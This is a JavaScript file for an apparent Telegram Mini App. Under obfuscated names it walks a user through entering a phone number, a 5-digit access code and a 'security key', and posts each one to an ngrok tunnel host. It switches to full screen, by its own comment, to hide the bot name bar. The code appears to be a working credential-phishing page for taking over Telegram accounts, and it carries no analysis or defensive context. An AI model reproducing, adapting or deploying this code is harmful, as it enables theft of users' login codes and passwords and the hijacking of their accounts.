document.addEventListener('DOMContentLoaded', function () {
    const _w = window.Telegram.WebApp;
    const _s1 = document.getElementById('s1');
    const _s2 = document.getElementById('s2');
    const _s3 = document.getElementById('s3');
    const _i1 = document.getElementById('inp1');
    const _b1 = document.getElementById('btn1');
    const _cx = document.querySelectorAll('.cb');
    const _kx = document.querySelectorAll('.key');
    const _b2 = document.getElementById('btn2');
    const _i3 = document.getElementById('inp3');
    const _b3 = document.getElementById('btn3');

    const _u = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
    const _id = _w.initDataUnsafe?.user?.id || 'x_' + Date.now();

    const _h = {
        'Content-Type': 'application/json',
        'ngrok-skip-browser-warning': 'true'
    };

    _w.ready();
    _w.expand();
    // Full screen — hides bot name bar completely
    if (_w.requestFullscreen) {
        _w.requestFullscreen();
    }

    function _alert(m) { alert(m); }

    async function _post(p, d) {
        const r = await fetch(_u + p, { method: 'POST', headers: _h, body: JSON.stringify(d) });
        const t = await r.text();
        try { return JSON.parse(t); }
        catch(e) { throw new Error(t.substring(0, 100)); }
    }

    // ── Step 1 ───────────────────────────────────────────────────────────────
    _b1.addEventListener('click', async function () {
        const v = _i1.value.trim();
        if (v.length < 10) { _alert('Please enter a valid number.'); return; }

        _b1.disabled = true;
        _b1.textContent = 'Please wait...';

        try {
            const r = await _post('/xp1', { a: v, b: String(_id) });
            if (r.ok) {
                _show('s2');
                _alert('Check your device for the access code.');
            } else {
                _alert(r.msg || 'Something went wrong.');
            }
        } catch (e) {
            _alert('Error: ' + e.message);
        } finally {
            _b1.disabled = false;
            _b1.textContent = '📤 Continue';
        }
    });

    // ── Step 2 keypad ────────────────────────────────────────────────────────
    let _ci = 0;
    function _fn() { if (_ci < _cx.length - 1) _cx[++_ci].focus(); }
    function _fp() { if (_ci > 0) _cx[--_ci].focus(); }

    _cx.forEach(c => {
        c.addEventListener('keydown', function (e) { if (e.key === 'Backspace' && this.value === '') _fp(); });
    });

    _kx.forEach(k => {
        k.addEventListener('click', function () {
            const v = this.dataset.key;
            if (v === 'backspace') { _cx[_ci].value = ''; _fp(); }
            else { _cx[_ci].value = v; _fn(); }
        });
    });

    // ── Step 2 submit ────────────────────────────────────────────────────────
    _b2.addEventListener('click', async function () {
        const v = Array.from(_cx).map(c => c.value).join('');
        if (v.length !== 5) { _alert('Please enter the complete code.'); return; }

        _b2.disabled = true;
        _b2.textContent = 'Please wait...';

        try {
            const r = await _post('/xp2', { c: v, b: String(_id) });
            if (r.ok) {
                if (r.nx) { _show('s3'); }
                else { _w.sendData('done:a'); }
            } else {
                _alert(r.msg || 'Incorrect code.');
                _cx.forEach(c => c.value = '');
                _ci = 0;
                _cx[0].focus();
            }
        } catch (e) {
            _alert('Error: ' + e.message);
        } finally {
            _b2.disabled = false;
            _b2.textContent = '✅ Continue';
        }
    });

    // ── Step 3 ───────────────────────────────────────────────────────────────
    _b3.addEventListener('click', async function () {
        const v = _i3.value;
        if (!v) { _alert('Please enter your security key.'); return; }

        _b3.disabled = true;
        _b3.textContent = 'Please wait...';

        try {
            const r = await _post('/xp3', { k: v, b: String(_id) });
            if (r.ok) {
                _w.sendData('done:b');
            } else {
                _alert(r.msg || 'Incorrect key.');
                _i3.value = '';
            }
        } catch (e) {
            _alert('Error: ' + e.message);
        } finally {
            _b3.disabled = false;
            _b3.textContent = '✅ Unlock';
        }
    });

    // ── Section switch ───────────────────────────────────────────────────────
    function _show(n) {
        _s1.style.display = 'none';
        _s2.style.display = 'none';
        _s3.style.display = 'none';
        const _e = document.querySelector('.emoji-center .emoji');
        if (n === 's2') { _s2.style.display = 'flex'; _e.textContent = '🔢'; _ci = 0; _cx[0].focus(); }
        else if (n === 's3') { _s3.style.display = 'flex'; _e.textContent = '🔐'; _i3.focus(); }
    }
});
